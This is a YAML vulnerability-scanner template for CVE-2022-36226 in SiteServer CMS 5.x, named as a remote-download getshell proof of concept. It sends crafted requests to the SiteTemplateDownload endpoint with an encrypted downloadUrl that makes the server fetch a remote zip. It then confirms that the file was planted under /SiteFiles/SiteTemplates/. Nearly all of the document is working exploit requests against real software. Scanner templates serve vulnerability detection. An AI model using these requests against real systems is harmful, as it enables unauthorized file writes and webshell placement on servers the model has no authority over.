name: poc-yaml-sscms-cve-2022-36226-remote-download-getshell
binding: 92239687-41c4-4f54-8b44-11b83798f554
manual: true
detail:
    author: secking
    links:
        - https://nvd.nist.gov/vuln/detail/CVE-2022-36226
        - https://cxsecurity.com/cveshow/CVE-2022-36226/
        - https://github.com/we1h0/SiteServer-CMS-Remote-download-Getshell
    vulnerability:
        id: CT-477280
        level: high
    description: SiteServerCMS 5.X 后台
transport: http
set:
    names: randomLowercase(8)
rules:
    r0:
        request:
            cache: false
            method: GET
            path: /SiteServer/Ajax/ajaxOtherService.aspx?type=SiteTemplateDownload&userKeyPrefix=test&downloadUrl=aZlBAFKTavCNYC00add0U8IkyzeYWra91TQw1kXPzNZXi9X6ghI8ZQqP0slash0iR9TeDSjX27bjPQJQaDDYQfrvzGg16qmg0equals00equals0&directoryName={{names}}
        expression: response.status == 200 && response.body.bcontains(bytes("6D74683C"))
    r1:
        request:
            cache: false
            method: GET
            path: /Ajax/ajaxOtherService.aspx?type=SiteTemplateDownload&userKeyPrefix=test&downloadUrl=aZlBAFKTavCNYC00add0U8IkyzeYWra91TQw1kXPzNZXi9X6ghI8ZQqP0slash0iR9TeDSjX27bjPQJQaDDYQfrvzGg16qmg0equals00equals0&directoryName={{names}}
        expression: response.status == 200 && response.body.bcontains(bytes("6D74683C"))
    r2:
        request:
            cache: false
            method: GET
            path: /SiteFiles/SiteTemplates/{{names}}.zip
        expression: response.status == 200 && response.body.bcontains(bytes("cznu1z4e4zehm0ev2tcf8l7chnoponddc"))
expression: (r0() || r1()) && r2()
